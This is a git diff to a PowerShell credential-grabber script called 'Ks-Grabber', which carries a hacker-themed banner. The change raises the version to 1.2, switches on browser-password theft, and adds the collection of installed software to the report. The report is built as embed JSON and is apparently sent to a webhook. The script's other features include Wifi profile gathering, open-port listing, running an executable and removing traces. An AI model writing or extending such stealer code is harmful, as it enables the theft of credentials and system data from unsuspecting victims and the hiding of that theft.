@@ -12,7 +12,7 @@ Write-Output "
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣦⠈⣿⣼⣿⣿⣿⡾⠆⠀⠙⣿⣿⠇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \_____\\____\\\____\\____\\_____\_\____\/
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢯⠀⢻⣿⣿⣿⣿⣶⣶⣷⣾⣿⣣⣴⣾⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   Dedsec has given you the truth. Do what you will.
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠖⢿⡆⠸⣏⢳⡼⣿⣿⣿⣿⣿⣟⠉⠙⠛⠋⣭⣷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀   
-⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V1.1
+⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V1.2
 ⠀⠀⠀⠀⠀⠀⣼⣿⠢⠬⣭⣿⣿⣧⢸⣿⣯⡑⠦⣾⣿⡟⣡⣔⣁⠴⢟⣱⠂⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀   @im.nix
 ⠀⠀⠀⠀⣠⣾⠋⠀⣄⢀⣿⣿⢿⣷⠀⣿⢧⡙⢦⣙⣿⣿⣽⣿⣁⣹⠟⠛⢀⡇⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀ 
 ⠀⠀⠀⣰⠃⣏⣹⣦⣿⣿⡿⠁⠀⢿⣇⢘⡶⢬⣉⣿⣽⣿⣟⣻⣤⠆⣠⣺⣾⡇⡂⠀⢠⠘⡇⠀⠀⠀⠀⠀⠀
@@ -33,7 +33,8 @@ $features = @{
     "gatherWifiProfiles" = $true
     "gatherOpenPorts" = $true
     "executeExe" = $false
-    "gatherBrowserPass" = $false
+    "gatherBrowserPass" = $true
+    "gatherInstalledSoftware" = $true
     "removeTraces" = $true
 }
 foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature")) { Set-Variable -Name $feature -Value $features[$feature] } }
@@ -96,6 +97,15 @@ if ($gatherOpenPorts) {
     $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort -Unique
     $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort -Unique
     $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
+}
+
+<# Installed Software #>
+if ($gatherInstalledSoftware) {
+    Write-Output "[ + ] Gathering installed software"
+    $installedSoftware = Get-ChildItem -Path "C:\Program Files" | Select-Object -ExpandProperty Name | Out-String
+    if ([string]::IsNullOrEmpty($installedSoftware)) {
+        $installedSoftware = "ERROR: No software found or access denied"
+    }
 }
 
 <# Execute File #>
@@ -192,6 +202,15 @@ $json = @{
                 color = 0
                 author = @{
                     name = "Open Ports"
+                }
+            }
+        }
+        if ($gatherInstalledSoftware) {
+            @{
+                description = "``````$($installedSoftware)``````"
+                color = 0
+                author = @{
+                    name = "Installed Software"
                 }
             }
         }
